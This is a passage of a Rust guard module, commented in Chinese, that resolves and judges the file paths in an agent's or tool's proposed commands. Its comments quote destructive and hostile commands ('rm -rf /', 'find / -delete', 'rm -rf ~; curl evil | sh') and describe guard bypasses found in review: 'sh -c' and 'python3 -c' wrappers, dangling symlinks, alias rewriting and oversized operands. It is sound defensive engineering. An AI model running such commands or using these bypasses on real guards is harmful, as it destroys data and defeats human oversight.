//! 路径模型：把一个命令操作数变成"这到底动的是哪个目录"这件可判断的事。
//!
//! # 为什么住在 guard-schema 而不是 guard-shell
//!
//! 它诞生在 `guard-shell` 里（B0），因为当时只有那道门需要判路径。B1 之后引擎自己也要判：
//! 一次 `FileDelete` 事件进来，引擎必须**自己算**这条路径落在 `TaskScope.paths` 天花板的哪一边，
//! 而不是相信事件里携带的一个"我已经判过了"的结论——那是攻击者可断言的输入用在放行方向上，
//! 是本项目反复抓到的第一种缺陷形态。
//!
//! 两个消费者，所以只能有一份实现。它解释的是 `TaskScope.paths`，而那住在 guard-schema，
//! 所以这里是它的自然位置。`guard-shell` 原样 re-export，B0 的调用点一行都没改。
//!
//! # 为什么必须有这个模块
//!
//! `docs/scope-and-non-goals.md` 里量过一张表：四种删除写法，`guard-shell` 给出**同一个答案**。
//!
//! | 提议的动作 | 修这个模块之前的判决 |
//! |---|---|
//! | `find <项目目录> -depth -delete` | `Ask [SHELL-UNKNOWN-TOOL]` |
//! | `find / -delete` | `Ask [SHELL-UNKNOWN-TOOL]` |
//! | `rm -rf /` | `Ask [SHELL-UNKNOWN-TOOL]` |
//! | `find "$id" -delete`（`$id` 为空）| `Ask [SHELL-UNKNOWN-TOOL]` |
//!
//! 它分不出"删项目"和"删磁盘"。因为它只有三样东西：工具名白名单、动作名黑名单、shell 元字符筛查。
//! `denied_actions` 里躺着 `delete_system`，但那要求宿主传进来的动作字符串**字面等于** `delete_system`；
//! `-delete` 匹配不上。元字符检查能挡住 `rm -rf ~; curl evil | sh`，但 `find / -delete` 一个元字符都没有，
//! 干干净净地通过了。
//!
//! 设计文档（`docs/interception-design.md`）把这件事列为 **B0**，也就是第一步，理由是：网关（A 层）
//! 和沙箱（B 层）都建在"守卫能说出一个路径是什么"之上。不先修它，网关只是把一个不会判路径的东西
//! 搬到了路径上。
//!
//! # 三件必须分清的事
//!
//! **一、无条件危险的目标。** `/`、`/etc`、`C:\Windows`、`~/.ssh`、`/dev/sda`。这些跟有没有声明工作区
//! 无关——没有任何任务需要删掉 `/etc`。这类判 `Deny`，而且不需要任何策略配置就生效。
//!
//! **二、能不能证明落在授权范围内。** 这需要工作区声明（来自 `task-plans.yaml` 的 `paths` 天花板）。
//! 声明了就能判"里面/外面"；没声明就**证明不了**，而证明不了不等于安全。
//!
//! **三、根本不是路径、或者无法归约成一个路径的操作数。** 通配符 `~/ws/*`、空字符串、相对路径没有基准。
//! 这些一律**不能**判 `Allow`——但也不该一律 `Deny`，否则工具没法用。它们判 `Ask`，并且理由里说清
//! 是"无法证明"而不是"已确认危险"。
//!
//! # 归约的顺序很重要
//!
//! 1. 展开 `~`
//! 2. 相对路径按基准目录变成绝对路径
//! 3. **把已存在的最长前缀做 `canonicalize`**——这一步是为了抓符号链接。`~/ws/link -> /etc` 用纯词法
//!    归约看不出来，因为词法上它确实在 `~/ws` 下面。
//! 4. 剩下不存在的那一段做词法归约（解 `.` 和 `..`）
//! 5. **去掉 macOS 的卷别名前缀**，把结果归一到一个空间（见 [`dealias_platform_volumes`]）
//!
//! 顺序反了就有洞：先词法归约再 canonicalize，`~/ws/link/../../etc` 会先被词法解成 `~/etc`，
//! 符号链接那一跳就丢了。
//!
//! 第 5 步必须在 canonicalize **之后**：它要处理的正是 canonicalize 产出的那种形状。

use std::path::{Component, Path, PathBuf};

/// 这个操作数会被怎么动。
///
/// 从动词和标志推断，而不是让宿主自报——宿主自报的话，一个说自己在 `read` 的 `rm` 就绕过去了。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathIntent {
    /// 只读。
    Read,
    /// 写入或创建。
    Write,
    /// 删除、截断、覆写设备。最危险的一类。
    Delete,
}

impl PathIntent {
    /// 是否需要写权限。
    pub fn needs_write(self) -> bool {
        matches!(self, PathIntent::Write | PathIntent::Delete)
    }

    pub fn as_str(self) -> &'static str {
        match self {
            PathIntent::Read => "read",
            PathIntent::Write => "write",
            PathIntent::Delete => "delete",
        }
    }
}

/// 工作区：允许读的和允许写的路径。
///
/// 来源是 `task-plans.yaml` 的 `scope.paths`，也就是会话作用域已有的那套天花板机制。复用而不是
/// 另建一套，是为了让"引擎推理的东西"和"内核将来要执行的东西"是同一份声明——两份必须保持一致的
/// 策略文件，就是它们开始不一致的方式。
#[derive(Debug, Clone, Default)]
pub struct Workspace {
    read: Vec<PathBuf>,
    write: Vec<PathBuf>,
    /// `paths:` 这一节出现过吗。**不是**从列表是否为空反推 —— 见 `is_declared`。
    declared: bool,
}

impl Workspace {
    /// 从声明构造。路径在这里就归约好，后面每次比较都不用重做。
    ///
    /// 归约失败的条目被**丢弃**并计入 `rejected`，而不是当成"匹配一切"。一个坏掉的授权条目
    /// 如果被当成通配，就是把策略错误变成了权限放大。
    ///
    /// # 为什么授权里的相对路径一律拒绝
    ///
    /// 这一条是写这个函数的第一版时漏掉的，被测试抓了出来。第一版用 `ResolveContext::current()`
    /// 归约授权条目，于是 `task-plans.yaml` 里写 `build/out` 会按**进程启动时的工作目录**变成
    /// 绝对路径——同一份策略文件，从桌面壳子启动和从 CLI 启动，授权的是两个不同的目录。一份
    /// 会随调用位置改变含义的策略，比没有策略更糟：它看起来是确定的。
    ///
    /// 所以授权必须是绝对路径或者 `~` 开头。`~` 可以，因为家目录是这台机器上这个用户的一个
    /// 确定值，不是调用现场的偶然产物。
    pub fn new<I, S>(read: I, write: I) -> (Self, Vec<String>)
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        // cwd 故意留空：授权条目里的相对路径必须归约失败。
        let grant_ctx = ResolveContext {
            home: ResolveContext::current().home,
            cwd: None,
        };
        let mut rejected = Vec::new();
        let mut norm = |items: I| -> Vec<PathBuf> {
            let mut out = Vec::new();
            for item in items {
                let raw = item.as_ref();
                match resolve(raw, grant_ctx.clone()) {
                    Ok(p) => out.push(p),
                    Err(why) => rejected.push(format!("{raw:?}: {why}")),
                }
            }
            out.sort();
            out.dedup();
            out
        };
        let read = norm(read);
        let write = norm(write);
        (
            Self {
                read,
                write,
                declared: true,
            },
            rejected,
        )
    }

    /// 明确表示"这次会话没有声明 paths 天花板"。
    ///
    /// 这是 `Default` 的语义,写成一个有名字的构造器,免得下一个人再从"列表空不空"里
    /// 猜它。
    pub fn undeclared() -> Self {
        Self::default()
    }

    /// 有没有声明过任何东西。没声明和"声明为空"是两回事：没声明意味着证明不了，
    /// 声明为空意味着明确不给。
    ///
    /// 这条注释以前是对的而代码是错的:实现从"两个列表都空"反推出"没声明",于是
    /// `paths: {read: [], write: []}`(仓库自己的 `task-plans.yaml` 里 `navigation_jump`
    /// 就是这个形状)被当成没声明,写得到 `Ask SHELL-PATH-UNSCOPED` 而不是 `Deny`。
    /// 现在记的是"`paths:` 这一节出现过吗",而不是列表是否为空。
    pub fn is_declared(&self) -> bool {
        self.declared
    }

    pub fn read_grants(&self) -> &[PathBuf] {
        &self.read
    }

    pub fn write_grants(&self) -> &[PathBuf] {
        &self.write
    }

    /// 写授权隐含读授权：能写的地方当然能读。反过来不成立。
    fn grants_for(&self, intent: PathIntent) -> Vec<&PathBuf> {
        if intent.needs_write() {
            self.write.iter().collect()
        } else {
            self.read.iter().chain(self.write.iter()).collect()
        }
    }

    /// 判断一个已归约的绝对路径是否落在对应授权里。
    pub fn contains(&self, path: &Path, intent: PathIntent) -> Option<PathBuf> {
        self.grants_for(intent)
            .into_iter()
            .find(|g| is_within(g, path))
            .cloned()
    }
}

/// 归约时需要的环境。
#[derive(Debug, Clone)]
pub struct ResolveContext {
    /// `~` 展开成什么。`None` 表示不知道，此时含 `~` 的路径归约失败而不是被当成字面目录名。
    pub home: Option<PathBuf>,
    /// 相对路径的基准。`None` 表示不知道，此时相对路径归约失败。
    pub cwd: Option<PathBuf>,
}

impl ResolveContext {
    /// 用当前进程的环境。
    pub fn current() -> Self {
        Self {
            home: std::env::var_os("HOME")
                .or_else(|| std::env::var_os("USERPROFILE"))
                .map(PathBuf::from),
            cwd: std::env::current_dir().ok(),
        }
    }

    /// 用显式的值，测试用；也让宿主能代理一个不同的用户。
    pub fn with(home: Option<&str>, cwd: Option<&str>) -> Self {
        Self {
            home: home.map(PathBuf::from),
            cwd: cwd.map(PathBuf::from),
        }
    }
}

/// 通配符字符。带这些的操作数无法归约成一个路径。
const GLOB_CHARS: &[char] = &['*', '?', '['];

/// 把一个操作数归约成绝对、无 `..`、符号链接已解开的路径。
///
/// `Err` 的语义是"证明不了"，不是"安全"。调用方必须把它当成不能放行的理由。
pub fn resolve(operand: &str, ctx: ResolveContext) -> Result<PathBuf, String> {
    resolve_with_aliases(operand, ctx, VolumeAliases::for_host())
}

/// [`resolve`] 的可注入版本 —— 让 Linux 上的测试能走 macOS 那条折叠路径。
pub fn resolve_with_aliases(
    operand: &str,
    ctx: ResolveContext,
    aliases: VolumeAliases,
) -> Result<PathBuf, String> {
    let raw = operand.trim();
    // 长度上限,放在任何逐分量的工作**之前**。
    //
    // `MAX_COMPONENTS` 那道闸虽然砍掉了 O(n²),但 `components().count()`、通配符扫描、
    // `PathBuf` 构造本身仍然要把 1 MB 走几遍,实测还剩 2.16 秒 —— 对一个单线程的判决
    // 循环来说仍然是可用的拒绝服务。而主流系统的 `PATH_MAX` 是 4096 字节,所以超过这个
    // 量级本身就是"这不是一条路径"的证据,不需要再往下算。
    const MAX_OPERAND_BYTES: usize = 8192;
    if raw.len() > MAX_OPERAND_BYTES {
        return Err(format!(
            "操作数长度 {} 字节超过上限 {MAX_OPERAND_BYTES}；无法判定,不放行",
            raw.len()
        ));
    }
    if raw.is_empty() {
        // 空操作数不是无害的。`find "" -delete` 会变成 `find -delete`，从当前目录开始递归删。
        // 这正是 scope-and-non-goals 表里第四行那个 `$id` 为空的场景。
        return Err("操作数为空；命令会退化成对当前目录操作".into());
    }
    let glob_input = glob_input(raw)?;
    if glob_input.chars().any(|c| GLOB_CHARS.contains(&c)) {
        return Err(format!(
            "含通配符 {raw:?}；一个通配符可以展开到授权之外，无法证明包含关系"
        ));
    }
    if raw.contains('\0') {
        return Err("操作数含 NUL 字节".into());
    }
    // 一个操作数携带了整条命令,不是路径 —— 而把它当路径归约出来的"包含性证明"是虚构的。
    //
    // 这是本模块最严重的一个绕过。`looks_like_path` 把任何含 `/` 的字符串当路径,`resolve`
    // 再把它当相对路径拼到 cwd 上,于是 `sh -c "rm -rf /"` 里那条命令被归约成
    // `<cwd>/rm -rf`,判成"在写授权内",判决从 `Deny` 降成 `Ask`,再被网关的天花板预授权
    // 升级成**直接执行、不问人**。复核实测:
    //
    // ```text
    // ① 直写 rm -rf <天花板外的目录>          -> Refuse(拒绝)
    // ② sh -c "rm -rf <同一个目录>"           -> Execute(执行),文件真的被删,一次都没问人
    //    审计记下来的路径是 "<cwd>/rm -rf <目录>" —— 一个不存在、也永远不会被碰的路径
    // ```
    //
    // 而且不是 `sh` 特有的,所以给 argv[0] 加黑名单修不了:
    // `python3 -c "open('<天花板外>','w').write('PWNED')"` 走同一条路,同样落盘。
    //
    // 元字符筛子放过这些 payload 是**正确**的 —— `rm -rf /` 里没有 `;|&$`。问题全在于
    // 路径层把它当成了一条路径。所以判据放在这里:一个真实的单路径操作数不会同时含有
    // 空白**和**多个路径分量,也不会含有 shell/解释器语法字符。
    if let Some(why) = not_a_single_path(raw) {
        return Err(why);
    }

    // 一、展开 `~`
    let expanded: PathBuf = if raw == "~" || raw.starts_with("~/") || raw.starts_with("~\\") {
        let home = ctx
            .home
            .as_ref()
            .ok_or_else(|| "路径以 ~ 开头但不知道家目录".to_string())?;
        if raw == "~" {
            home.clone()
        } else {
            home.join(&raw[2..])
        }
    } else if raw.starts_with('~') {
        // `~otheruser/...`：需要查用户数据库，这里不做，也不猜。
        return Err(format!(
            "{raw:?} 指向另一个用户的家目录，无法在不查用户库的情况下归约"
        ));
    } else {
        PathBuf::from(raw)
    };

    // 二、变成绝对路径
    let absolute = if expanded.is_absolute() {
        expanded
    } else {
        let cwd = ctx
            .cwd
            .as_ref()
            .ok_or_else(|| format!("{raw:?} 是相对路径但不知道基准目录"))?;
        cwd.join(expanded)
    };

    // 三、把已存在的最长前缀 canonicalize，抓符号链接
    let (canonical_prefix, remainder) = canonicalize_existing_prefix(&absolute);

    // 四、剩下那段做词法归约
    let mut out = canonical_prefix;
    for comp in remainder.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => {
                // `pop` 到根就停住。让 `..` 越过根，等于让 `/../../etc` 归约成 `/etc` 之外的东西。
                out.pop();
            }
            Component::Normal(c) => out.push(c),
            // 前缀和根只会出现在开头，而开头已经在 canonical_prefix 里了。
            Component::RootDir | Component::Prefix(_) => {}
        }
    }
    // 五、去掉 macOS 的卷别名,归一到一个空间。必须在 canonicalize 之后 ——
    // 它处理的就是 canonicalize 产出的那种形状。
    //
    // **只在 macOS 上折。** 见 `VolumeAliases`:在别的平台上这是改写而不是归一化,
    // 而改写会让守卫判决的路径和执行方写入的路径分家。
    Ok(dealias_with(&out, aliases))
}

/// 返回需要扫描通配符的部分，并验证 Windows verbatim 命名空间。
///
/// Windows verbatim 路径固定以 `\\?\` 开头；这里的 `?` 是路径命名空间标记，不是 glob。
/// 只接受能与普通路径做语义等价比较的盘符和 UNC 形态。`GLOBALROOT`、卷 GUID、PIPE 等其它
/// 命名空间无法由当前敏感目录与工作区规则证明，必须 fail-closed。
fn glob_input(raw: &str) -> Result<&str, String> {
    #[cfg(target_os = "windows")]
    if let Some(rest) = raw.strip_prefix(r"\\?\") {
        let bytes = rest.as_bytes();
        let drive = bytes.len() >= 3
            && bytes[0].is_ascii_alphabetic()
            && bytes[1] == b':'
            && bytes[2] == b'\\';
        let unc = bytes
            .get(..4)
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case(b"UNC\\"))
            && {
                let mut parts = rest[4..].split('\\');
                parts.next().is_some_and(|part| !part.is_empty())
                    && parts.next().is_some_and(|part| !part.is_empty())
            };
        if drive || unc {
            return Ok(rest);
        }
        return Err(format!(
            "不支持的 Windows verbatim 命名空间 {raw:?}；无法证明它属于已授权或敏感路径"
        ));
    }

    Ok(raw)
}

/// 去掉 macOS 的 firmlink / synthetic 卷别名前缀,把路径归一到**逻辑**形式。
///
/// # 这是在修什么
///
/// macOS 上 `/home`、`/tmp`、`/var`、`/etc` 都不是真目录,是 firmlink 或
/// synthetic 链接。`std::fs::canonicalize` 会把它们解成物理位置:
///
/// ```text
/// /home            → /System/Volumes/Data/home
/// /Users/me/doc    → /System/Volumes/Data/Users/me/doc   (经过 firmlink 时)
/// /etc/hosts       → /private/etc/hosts
/// /tmp/x           → /private/tmp/x
/// ```
///
/// 而敏感目录表里有 `/System`。于是**用户自己的文档被判成系统文件** ——
/// `/System/Volumes/Data/Users/me/Documents/x.md` 命中"在系统目录 /System 之内"。
/// 这不是假想:一次外部评审在 macOS 上跑出 8 个失败,全是这个,已经影响到删除、
/// 复制和工作区授权的判决。
///
/// # 两个方向都会坏,而危险的是另一个方向
///
/// 误判成敏感只是误报,吵但安全。反过来才要命:一条写成 `/etc/**` 的策略,
/// 拿到的却是 `/private/etc/passwd`,前缀匹配**不成立** —— 规则静默地不生效。
/// 工作区边界同理:工作区是 `/Users/me/proj`,而路径解成
/// `/System/Volumes/Data/Users/me/proj/f`,于是"在工作区内"判不出来。
///
/// 所以修法不是往敏感目录表里继续加别名(那是打地鼠,而且只修得了误报那一半),
/// 而是把两边归一到同一个空间。
///
/// # 为什么**不**用 `#[cfg(target_os = "macos")]`
///
/// 因为那样这个 bug 就永远只有 macOS 能发现。这个仓库已经为同一个形状吃过亏 ——
/// `check-macos-paths.sh` 那个脚本存在的理由就是"跨平台 crate 的自动化只对它当前
/// 能编译的那个平台负责"。而那个脚本只查**编译**,不查语义,所以这条它一个字
/// 都没说。
///
/// 无条件生效是安全的:Linux 上没有 `/System/Volumes/Data` 这种路径,所以对真实的
/// Linux 路径是恒等变换(有测试钉住)。而且别名折叠的方向永远是"更敏感"那边 ——
/// `/System/Volumes/Data/etc` 折成 `/etc` 之后更敏感,不是更宽松。
pub fn dealias_platform_volumes(path: &Path) -> PathBuf {
    dealias_with(path, VolumeAliases::Fold)
}

/// 要不要折叠平台卷别名。
///
/// # 为什么这必须是一个开关,而不是无条件生效
///
/// 第一版是无条件的,理由写着"Linux 上没有 `/System/Volumes/Data` 这种路径"。
/// **那是对文件系统的假设,不是这个函数的性质**,而且没有任何东西在保证它。
/// 一次独立对抗性复核把后果跑出来了:
///
/// ```text
/// 天花板        /tmp/ws
/// 操作数        /System/Volumes/Data/tmp/ws/pwned.txt
/// 守卫判决用的  /tmp/ws/pwned.txt        <- 折过的,判成"在天花板内",还跳过了人工确认
/// 执行方写的    /System/Volumes/Data/tmp/ws/pwned.txt   <- 原始的,在 Linux 上是另一个文件
/// ```
///
/// 在 macOS 上两者是同一个 inode(firmlink),所以不分叉。在 Linux 上它们是两个文件 ——
/// 而 `guard-gateway` 和 `guard-jail` 恰好跑在 Linux 上,后者的执行器还自带
/// `create_dir_all`,能把这个目录形状**创建出来**。于是折叠从"归一化"变成了"改写",
/// 而改写让判决对象和执行对象分了家。
///
/// 所以折叠是一条 **macOS 的文件系统事实**,不是一个可移植的归一化。它按平台开关。
///
/// # 那怎么在 Linux 上测
///
/// 靠**注入**,不靠无条件生效。纯函数用写死的 macOS 形状输入直接测;应用点
/// (`resolve` / `sensitive_target`)提供 `*_with_aliases` 变体,让 Linux 上的测试
/// 能走 `Fold` 那条路。这样"macOS 才折"和"Linux 也测得到"两件事都成立 ——
/// 而上一版为了后者牺牲了前者。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum VolumeAliases {
    /// 折叠 —— macOS 的语义。
    Fold,
    /// 原样保留 —— 其它平台。
    Keep,
}

impl VolumeAliases {
    /// 当前宿主平台该用哪个。
    pub fn for_host() -> Self {
        if cfg!(target_os = "macos") {
            Self::Fold
        } else {
            Self::Keep
        }
    }
}

fn dealias_with(path: &Path, mode: VolumeAliases) -> PathBuf {
    if mode == VolumeAliases::Keep {
        return path.to_path_buf();
    }
    let s = path.to_string_lossy();

    // 数据卷根:firmlink 视图下每一条用户路径都在它下面。
    // 折完之后必须还是绝对路径 —— `/System/Volumes/Data` 本身折成 `/`。
    for prefix in ["/System/Volumes/Data/", "/System/Volumes/Data"] {
        if let Some(rest) = s.strip_prefix(prefix) {
            let rest = rest.trim_start_matches('/');
            return PathBuf::from(format!("/{rest}"));
        }
    }

    // `/private` 下面**只有这几个**是 synthetic 别名。不做通配 ——
    // 一个真叫 `/private/myproject` 的目录不该被折成 `/myproject`。
    for name in ["etc", "var", "tmp"] {
        let full = format!("/private/{name}");
        if s == full {
            return PathBuf::from(format!("/{name}"));
        }
        if let Some(rest) = s.strip_prefix(&format!("{full}/")) {
            return PathBuf::from(format!("/{name}/{rest}"));
        }
    }

    path.to_path_buf()
}

/// 找到路径里最长的、真实存在的前缀并 canonicalize 它，返回它和剩下那一段。
///
/// 写入的目标通常还不存在，所以不能直接 `canonicalize` 整条路径。但中间某一段是符号链接的情况
/// 必须抓住，所以对存在的那部分要走真实解析。
fn canonicalize_existing_prefix(absolute: &Path) -> (PathBuf, PathBuf) {
    let mut prefix = absolute.to_path_buf();
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    // 分量数上限。
    //
    // 这个循环每轮弹掉一个分量、再对一条 O(n) 长的路径重做一次 `canonicalize`,总代价
    // O(n²) —— 而 MCP 的 argv 元素长度无上限,主循环又是 `for line in stdin.lock().lines()`
    // 单线程。实测(debug 与 release 一致,瓶颈是 syscall 和路径拷贝):
    //
    // ```text
    //  256000 字节 / 128000 分量 ->  1.645s
    //  512000 字节 / 256000 分量 ->  6.448s
    // 1024000 字节 / 512000 分量 -> 26.370s
    // ```
    //
    // 干净的四倍增长,4 MB 操作数约 7 分钟,一次调用把所有工具调用一起卡住。真实路径不会
    // 有几千个分量(多数系统的 PATH_MAX 是 4096 字节),所以超限本身就是"这不是一条路径"。
    const MAX_COMPONENTS: usize = 512;
    if absolute.components().count() > MAX_COMPONENTS {
        return (root_of(absolute), strip_root(absolute));
    }
    loop {
        if let Ok(c) = std::fs::canonicalize(&prefix) {
            let mut remainder = PathBuf::new();
            for part in tail.iter().rev() {
                remainder.push(part);
            }
            // 悬空符号链接:最后一段不存在时,它的**父目录链**里可能有一个链接指向天花板
            // 外,而 `canonicalize` 对整条路径失败,于是退回词法处理、判在天花板内 —— 可
            // 写它会顺着链接把天花板外那个文件**创建出来**。实测:
            //
            // ```text
            // ws/link_existing -> outside/existing.txt   resolve 解开了 -> Refuse  ✓
            // ws/link_dangling -> outside/planted.txt     resolve 没解开 -> Execute ✗
            //     写入 5 字节到 ws/link_dangling,而 outside/planted.txt 出现了
            // ```
            //
            // 也就是说符号链接不是"没处理",是**只处理了一半**,而漏掉的那一半正好是可种
            // 植的那一半 —— 悬空链接正是攻击者(或上一步合法的智能体动作)会留下的东西。
            //
            // 这里对 remainder 的每一段逐级检查:遇到符号链接就解开它,然后从解开的结果
            // 继续。`symlink_metadata` 不跟随,所以看得到链接本身。
            let mut base = c;
            let mut parts = remainder.components();
            let mut leftover = PathBuf::new();
            for part in parts.by_ref() {
                let cand = base.join(part.as_os_str());
                match std::fs::symlink_metadata(&cand) {
                    Ok(m) if m.file_type().is_symlink() => {
                        // 这一段是链接。解开它,把它的目标当作新的 base。
                        match std::fs::read_link(&cand) {
                            Ok(t) => {
                                let target = if t.is_absolute() { t } else { base.join(t) };
                                base = lexical_normalise(&target);
                            }
                            Err(_) => {
                                leftover.push(part.as_os_str());
                                break;
                            }
                        }
                    }
                    _ => {
                        leftover.push(part.as_os_str());
                        break;
                    }
                }
            }
            for part in parts {
                leftover.push(part.as_os_str());
            }
            return (base, leftover);
        }
        match prefix.file_name() {
            Some(name) => {
                tail.push(name.to_os_string());
                if !prefix.pop() {
                    break;
                }
            }
            // 到了根或者是个纯前缀（比如 `C:\`），没得再退了。
            None => break,
        }
    }
    // 一路都不存在（测试里的假路径，或者盘没挂）。退回纯词法处理，并保持绝对性。
    (root_of(absolute), strip_root(absolute))
}

/// 纯词法归约 `.` 和 `..`,不碰文件系统。
///
/// 给 `canonicalize_existing_prefix` 解开符号链接目标用:目标里可能有 `..`,而它此刻还
/// 不存在,`canonicalize` 用不上。
fn lexical_normalise(p: &Path) -> PathBuf {
    let mut out = root_of(p);
    for comp in p.components() {
        match comp {
            Component::CurDir | Component::RootDir | Component::Prefix(_) => {}
            Component::ParentDir => {
                out.pop();
            }
            Component::Normal(c) => out.push(c),
        }
    }
    out
}

fn root_of(p: &Path) -> PathBuf {
    let mut root = PathBuf::new();
    for comp in p.components() {
        match comp {
            Component::Prefix(pre) => root.push(pre.as_os_str()),
            Component::RootDir => root.push(Component::RootDir.as_os_str()),
            _ => break,
        }
    }
    if root.as_os_str().is_empty() {
        root.push(Component::RootDir.as_os_str());
    }
    root
}

fn strip_root(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for comp in p.components() {
        match comp {
            Component::Prefix(_) | Component::RootDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// `candidate` 是否等于 `grant` 或在它下面。
///
/// **按组件比，不按字符串前缀比。** 字符串前缀会把 `/home/user2` 判成在 `/home/user` 里面,
/// 那是另一个用户的家目录。
///
/// 大小写：按平台。Linux 上文件系统区分大小写，`~/ws` 和 `~/WS` 是两个目录，折叠大小写就等于
/// 把一个没授权的目录判成授权了。macOS 和 Windows 默认不区分，那里 `/Users/x` 和 `/users/x`
/// 确实是同一个目录，不折叠反而会漏。
pub fn is_within(grant: &Path, candidate: &Path) -> bool {
    let g: Vec<_> = grant.components().collect();
    let c: Vec<_> = candidate.components().collect();
    if c.len() < g.len() {
        return false;
    }
    g.iter().zip(c.iter()).all(|(a, b)| components_eq(a, b))
}

fn components_eq(a: &Component<'_>, b: &Component<'_>) -> bool {
    #[cfg(target_os = "windows")]
    if let (Component::Prefix(a), Component::Prefix(b)) = (a, b) {
        use std::path::Prefix;

        let os_eq = |x: &std::ffi::OsStr, y: &std::ffi::OsStr| {
            x.to_string_lossy().to_lowercase() == y.to_string_lossy().to_lowercase()
        };
        return match (a.kind(), b.kind()) {
            (Prefix::Disk(x), Prefix::Disk(y))
            | (Prefix::Disk(x), Prefix::VerbatimDisk(y))
            | (Prefix::VerbatimDisk(x), Prefix::Disk(y))
            | (Prefix::VerbatimDisk(x), Prefix::VerbatimDisk(y)) => x.eq_ignore_ascii_case(&y),
            (Prefix::UNC(xs, xh), Prefix::UNC(ys, yh))
            | (Prefix::UNC(xs, xh), Prefix::VerbatimUNC(ys, yh))
            | (Prefix::VerbatimUNC(xs, xh), Prefix::UNC(ys, yh))
            | (Prefix::VerbatimUNC(xs, xh), Prefix::VerbatimUNC(ys, yh)) => {
                os_eq(xs, ys) && os_eq(xh, yh)
            }
            // DeviceNS / Verbatim 等其它命名空间不能与盘符或 UNC 混为一谈；同形态仍沿用
            // Windows 的大小写不敏感比较。
            _ => os_eq(a.as_os_str(), b.as_os_str()),
        };
    }

    let (x, y) = (a.as_os_str(), b.as_os_str());
    if cfg!(any(target_os = "macos", target_os = "windows")) {
        x.to_string_lossy().to_lowercase() == y.to_string_lossy().to_lowercase()
    } else {
        x == y
    }
}

/// 无条件敏感的目标，以及它是什么。
///
/// 与工作区声明无关：没有任何任务需要写 `/etc` 或者删 `/`。这份清单存在的意义是让"没配置策略"
/// 的默认状态也能挡住最坏的几种情况——一个只有在配置正确时才生效的防护，等于没有。
pub fn sensitive_target(path: &Path, intent: PathIntent) -> Option<String> {
    sensitive_target_with_home(path, intent, ResolveContext::current().home.as_deref())
}

/// [`sensitive_target`] 的可注入版本。
///
/// 家目录作为参数传入，而不是每次调用去读环境变量。第一版直接在函数里读 `$HOME`，于是
/// 同一个路径在不同环境下得到不同答案，而 `$HOME` 没设时"家目录本身"那条检查**静默不跑** ——
/// 一个悄悄不执行的检查，和一个通过了的检查在返回值上无法区分。
pub fn sensitive_target_with_home(
    path: &Path,
    intent: PathIntent,
    home: Option<&Path>,
) -> Option<String> {
    sensitive_target_full(path, intent, home, VolumeAliases::for_host())
}

/// [`sensitive_target_with_home`] 的可注入版本 —— 让非 macOS 上的测试能走折叠那条路。
///
/// 这个参数不是为了测试方便才存在的:折叠是一条 macOS 的文件系统事实
/// (见 [`VolumeAliases`]),而"只在 macOS 生效"和"在 Linux 上也测得到"这两件事
/// 只能靠注入同时成立。上一版为了后者把折叠做成无条件的,代价是一个越界。
pub fn sensitive_target_full(
    path: &Path,
    intent: PathIntent,
    home: Option<&Path>,
    aliases: VolumeAliases,
) -> Option<String> {
    // 先归一化 macOS 的卷别名。`resolve` 那边已经做过一次,这里再做一次不是多余:
    //
    //   - 这个函数是**公开**的,调用方不一定经过 `resolve`(测试、以及任何直接拿到
    //     一条已 canonicalize 过的路径的地方);
    //   - 它是真正做出安全判决的那个函数,而判决函数应该自己保证输入空间。
    //
    // 折叠是幂等的,所以做两次和做一次结果一样。
    let path = &dealias_with(path, aliases);
    let s = path.to_string_lossy();
    let lower = s.to_lowercase();

    // 家目录也要归一化后再比 —— 否则 `/Users/me` 和
    // `/System/Volumes/Data/Users/me` 会被当成两个不同的目录,于是"删掉整个家目录"
    // 这条判不出来。
    let home = home.map(|h| dealias_with(h, aliases));
    let home = home.as_deref();

    // 根目录本身。
    let comps: Vec<_> = path.components().collect();
    let is_root = comps
        .iter()
        .all(|c| matches!(c, Component::RootDir | Component::Prefix(_)));
    if is_root {
        return Some(format!("{s:?} 是文件系统根目录"));
    }

    // 家目录本身（删掉整个家目录）。
    if let Some(home) = home {
        let h = std::fs::canonicalize(home).unwrap_or_else(|_| home.to_path_buf());
        let h = dealias_with(&h, aliases);
        if *path == h && intent.needs_write() {
            return Some(format!("{s:?} 是家目录本身"));
        }
    }

    // 系统目录。写或删才算敏感——读 `/etc/hosts` 是正常的。
    //
    // 先放掉几个"名字长在系统目录下、实际是每用户可写区"的例外。不放的话在 macOS 上
    // **用户自己的临时目录**每一次写入都是 Critical:`$TMPDIR` 是
    // `/var/folders/<hash>/T/`,而 `/var` 在下面那张表里。
    // 这是一次独立复核指出来的,而且它是先前就存在的 —— `/private/var` 早就在表里,
    // 折叠只是让它换了个写法。
    //
    // 一个在正常路径上狂叫的守卫会被关掉,这句话这个项目已经付过学费。
    if intent.needs_write() && !is_per_user_scratch(path) {
        for dir in SYSTEM_DIRS {
            if is_within(Path::new(dir), path) {
                return Some(format!("{s:?} 在系统目录 {dir} 之内"));
            }
        }
    }

    // 凭据目录：读也算敏感，因为读走 `~/.ssh/id_rsa` 就是拿到了钥匙。
    //
    // 按**组件**匹配，不按子串。第一版用 `lower.contains("/.ssh")`，于是
    // `~/.sshfoo/notes.txt` 也被判成凭据目录 —— 一次误拒，而误拒的代价是让人把守卫关掉。
    let components: Vec<String> = path
        .components()
        .filter_map(|c| match c {
            Component::Normal(n) => Some(n.to_string_lossy().to_lowercase()),
            _ => None,
        })
        .collect();
    for entry in CREDENTIAL_DIRS {
        let want: Vec<String> = entry
            .trim_start_matches('/')
            .split('/')
            .map(|x| x.to_lowercase())
            .collect();
        if components.windows(want.len()).any(|w| w == want.as_slice()) {
            return Some(format!("{s:?} 落在凭据目录 {entry} 内"));
        }
    }

    // 裸设备：写它等于绕过文件系统覆写磁盘。
    //
    // 按**组件**判,不按字符串前缀。上一版是 `lower.starts_with(pat)`,于是
    // `/dev/sdcard-backups/notes.txt`、`/dev/nvme-notes/readme.md` 都被判成裸块设备
    // —— 一次误拒,而误拒的代价是让人把守卫关掉。
    //
    // 这个文件里 `CREDENTIAL_DIRS` 早就为同一个理由从子串匹配换成了组件窗口,
    // 这张表被落下了。一次独立复核指出来的。
